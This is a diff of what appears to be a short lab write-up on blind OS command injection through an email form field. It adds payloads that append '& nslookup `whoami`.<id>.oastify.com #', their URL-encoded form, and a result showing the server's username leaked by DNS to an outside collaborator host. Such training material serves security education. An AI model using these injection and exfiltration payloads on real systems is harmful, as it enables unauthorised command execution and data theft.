@@ -8,8 +8,15 @@ modify the email feild to contain the following payload and encod the following 
 
 & nslookup bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #
 
-& nslookup `whoami`.bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #
+& nslookup `whoami`.78dekltbefr0p2hz21mj7789q0wrkm8b.oastify.com #
 
 or
 
-& nslookup $(whoami).bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #
+& nslookup $(whoami).78dekltbefr0p2hz21mj7789q0wrkm8b.oastify.com #
+
+and encode the payload like so:
+exploit%40exploit.com+%26+nslookup+`whoami`.78dekltbefr0p2hz21mj7789q0wrkm8b.oastify.com+%23
+
+Result:
+
+peter-buWsdf.78dekltbefr0p2hz21mj7789q0wrkm8b.oastify.com.
